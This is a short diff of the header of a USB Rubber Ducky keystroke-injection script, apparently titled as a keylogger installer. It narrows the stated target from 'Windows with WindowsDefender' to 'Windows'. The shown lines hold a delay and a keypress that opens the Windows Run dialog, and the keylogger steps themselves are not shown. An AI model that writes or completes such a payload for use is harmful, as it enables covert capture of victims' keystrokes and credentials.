@@ -1,5 +1,5 @@
 REM Title: MirozoKeyloggerInstallInstallationScriptAndLaunchIt
-REM Target: Windows with WindowsDefender
+REM Target: Windows
 REM Author: Mirozo
 DELAY 500
 GUI r
